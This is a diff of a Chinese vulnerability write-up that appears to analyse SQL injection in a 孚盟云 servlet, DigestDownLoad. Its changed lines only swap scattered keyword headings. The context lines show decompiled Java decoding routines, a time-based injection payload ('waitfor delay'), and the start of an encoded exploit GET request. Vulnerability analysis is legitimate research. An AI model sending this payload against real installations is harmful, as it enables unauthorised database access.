@@ -35,11 +35,11 @@ asset_dir: embedded-base64
 
 深入探索
 
-原创内容授权
+计算机安全指南
 
-SaaS安全评估
+安全工具下载
 
-安全编码指南
+Windows安全工具
 
 ```
 public void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
@@ -87,11 +87,11 @@ public static final String decode(String var0) {
 
 深入探索
 
-企业资源计划
+孚盟云漏洞
 
-vpn
+Web安全培训
 
-技术文章投稿
+SQL注入防护
 
 ```
 public static String decrypt(String var0) {
@@ -115,7 +115,7 @@ public static String decrypt(String var0) {
 
 当 `var4=original` 时，执行以下处理逻辑
 
-SQL注入防护
+SQL注入检测
 
 ```
 var5 = var7.createStatement();
@@ -137,7 +137,7 @@ if (var4.equalsIgnoreCase("original")) {
 
 [漏洞利用](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)使用 `1'waitfor delay'0:0:5'--` 加密编码后来测试
 
-代码注入检测
+漏洞分析报告
 
 ```
 GET /servlet/DigestDownLoad?id=SPAATTP~32HJFPAATTPJPAATTP~32HJFPAATTPHNvno~33W~39Sm~33WBgDEqPAATTP~32HJFPAATTPWzCGPAATTP~32HJBPAATTPS~30TBXpcPpPAATTP~32HJFPAATTP~37~39l~37h~38PAATTP~33HJDPAATTP HTTP/1.1
